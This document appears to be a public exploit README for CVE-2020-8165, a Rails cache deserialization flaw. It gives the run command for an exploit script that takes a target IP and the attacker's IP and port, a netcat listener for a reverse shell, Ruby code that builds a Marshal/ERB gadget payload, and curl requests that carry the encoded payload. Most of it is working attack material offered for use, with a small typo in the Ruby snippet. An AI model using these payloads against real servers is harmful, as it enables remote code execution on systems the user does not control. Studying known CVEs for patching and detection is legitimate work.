# CVE-2020-8165

For educational purposes only.

# Description:
A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1
that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore
potentially resulting in an RCE.

# Usage:

In terminal 1:
```
python3 8165.py [Target IP] [Your IP] [Your PORT]
```

In terminal 2:
```
nc -lnvp [Your PORT]
```

# Initial Ruby exploit:

In rails console:
```
code = '`touch /tmp/rce`'
erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
payload Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)

puts "Payload"
require 'uri'
puts URI.encode_www_form(payload: payload)
```

In terminal:
```
curl 'localhost:3000/users?new=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T'
curl 'localhost:3000/users?new=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T'
```

# References:
https://groups.google.com/forum/#!topic/ruby-security-ann/OEWeyjD7NHY

https://github.com/masahiro331/CVE-2020-8165
